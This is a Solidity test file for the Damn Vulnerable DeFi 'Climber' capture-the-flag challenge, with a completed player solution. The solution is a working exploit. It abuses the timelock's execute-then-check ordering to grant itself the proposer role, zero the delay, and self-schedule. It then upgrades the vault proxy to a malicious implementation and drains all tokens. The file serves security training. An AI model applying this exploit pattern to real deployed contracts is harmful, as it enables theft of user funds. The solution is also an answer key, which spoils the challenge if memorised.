// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {ClimberVault} from "../../src/climber/ClimberVault.sol";
import {ClimberVaultV2} from "./ClimberVaultV2.sol";
import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract ClimberChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address proposer = makeAddr("proposer");
    address sweeper = makeAddr("sweeper");
    address recovery = makeAddr("recovery");

    uint256 constant VAULT_TOKEN_BALANCE = 10_000_000e18;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TIMELOCK_DELAY = 60 * 60;

    ClimberVault vault;
    ClimberTimelock timelock;
    DamnValuableToken token;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);
        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);

        // Deploy the vault behind a proxy,
        // passing the necessary addresses for the `ClimberVault::initialize(address,address,address)` function
        vault = ClimberVault(
            address(
                new ERC1967Proxy(
                    address(new ClimberVault()), // implementation
                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
                )
            )
        );

        // Get a reference to the timelock deployed during creation of the vault
        timelock = ClimberTimelock(payable(vault.owner()));

        // Deploy token and transfer initial token balance to the vault
        token = new DamnValuableToken();
        token.transfer(address(vault), VAULT_TOKEN_BALANCE);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public {
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(vault.getSweeper(), sweeper);
        assertGt(vault.getLastWithdrawalTimestamp(), 0);
        assertNotEq(vault.owner(), address(0));
        assertNotEq(vault.owner(), deployer);

        // Ensure timelock delay is correct and cannot be changed
        assertEq(timelock.delay(), TIMELOCK_DELAY);
        vm.expectRevert(CallerNotTimelock.selector);
        timelock.updateDelay(uint64(TIMELOCK_DELAY + 1));

        // Ensure timelock roles are correctly initialized
        assertTrue(timelock.hasRole(PROPOSER_ROLE, proposer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, deployer));
        assertTrue(timelock.hasRole(ADMIN_ROLE, address(timelock)));

        assertEq(token.balanceOf(address(vault)), VAULT_TOKEN_BALANCE);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */


    address[] public targets = new address[](4);
    uint256[] public values = new uint256[](4);
    bytes[] public dataElements = new bytes[](4);
    function test_climber() public checkSolvedByPlayer {
        // execute
            // grantRole
            // updateDelay
            // schedule
            // upgradeToAndCall

        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(this);
        targets[3] = address(vault);

        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;

        // grant timelock contract a proposal role to be able to register operations
        dataElements[0] = abi.encodeWithSelector(
            timelock.grantRole.selector,
            PROPOSER_ROLE,
            address(this)
        );

        // update the operations delay in order to process them thus making method getOperationState to return status OperationState.ReadyForExecution
        dataElements[1] = abi.encodeWithSelector(
            timelock.updateDelay.selector,
            0
        );

        dataElements[2] = abi.encodeWithSelector(this.schedule.selector);

        // deploy malicious implementation
        address newVaultImplementation = address(new ClimberVaultV2());
        // upgade to malicion implementation
        dataElements[3] = abi.encodeWithSelector(
            vault.upgradeToAndCall.selector,
            newVaultImplementation,
            hex""
        );

        timelock.execute(targets, values, dataElements, "");

        console.log(timelock.hasRole(
            PROPOSER_ROLE,
            address(this)
        ), 'hasRole');

        // drain vault funds
        (bool success, ) = address(vault).call(
            abi.encodeWithSelector(
                ClimberVaultV2.sweepFundsV2.selector, 
                address(token),
                recovery
            )
        );
        require(success);
    }

    function schedule() public {
        timelock.schedule(targets, values, dataElements, hex"");
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
    }
}
